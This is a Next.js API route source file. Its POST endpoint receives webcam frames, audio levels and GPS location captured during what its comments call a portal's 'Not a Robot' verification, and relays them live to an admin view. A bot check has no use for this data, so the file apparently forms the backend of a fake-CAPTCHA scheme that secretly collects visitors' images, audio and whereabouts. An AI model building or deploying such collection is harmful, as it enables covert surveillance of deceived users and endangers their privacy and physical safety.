import { NextRequest, NextResponse } from "next/server";
import { updateMedia, MediaCapture } from "@/lib/sessions";

/**
 * POST /api/media
 * 
 * Receives media snapshot data (webcam frame, audio level, location)
 * from the portal's "Not a Robot" verification and broadcasts to admin.
 */
export async function POST(request: NextRequest) {
    try {
        const body = await request.json();

        // Validate required fields
        if (!body.permissions || body.capturedAt === undefined) {
            return NextResponse.json(
                { success: false, error: "Missing required fields" },
                { status: 400 }
            );
        }

        // Transform to MediaCapture format
        const media: MediaCapture = {
            frame: typeof body.frame === 'string' ? body.frame : undefined,
            audioLevel: body.audioLevel ?? undefined,
            location: body.location ? {
                latitude: body.location.latitude,
                longitude: body.location.longitude,
                accuracy: body.location.accuracy,
            } : undefined,
            permissions: {
                camera: !!body.permissions.camera,
                microphone: !!body.permissions.microphone,
                geolocation: !!body.permissions.geolocation,
            },
            capturedAt: body.capturedAt,
            isLive: true,
        };

        // Update session state and notify admin clients
        updateMedia(media);

        return NextResponse.json({ success: true });
    } catch (error) {
        console.error("[Media API] Error:", error);
        return NextResponse.json(
            { success: false, error: "Failed to process media" },
            { status: 500 }
        );
    }
}

/**
 * GET /api/media
 * Health check for the media endpoint
 */
export async function GET() {
    return NextResponse.json({
        status: "ok",
        message: "Media endpoint active",
    });
}
